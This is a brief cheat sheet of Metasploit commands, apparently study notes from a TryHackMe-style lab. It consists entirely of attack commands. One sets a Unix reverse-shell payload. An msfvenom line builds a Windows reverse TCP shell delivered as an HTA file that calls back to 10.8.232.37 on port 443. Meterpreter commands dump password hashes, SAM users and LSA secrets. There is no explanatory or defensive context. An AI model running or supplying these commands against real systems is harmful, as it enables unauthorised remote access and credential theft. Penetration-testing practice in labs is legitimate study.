# Metasploit Commands

```
set PAYLOAD payload/cmd/unix/reverse
```
# MSFVenom Commands

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
```
dump hashes in a meterpreter session
```
hashdump
```
dump sam users in a meterpreter session
```
lsa_dump_sam
```
dump secrets in a meterpreter session.
```
lsa_dump_secrets
```
searches for the local exploit suggestor
```
search local_exploit_suggester
```
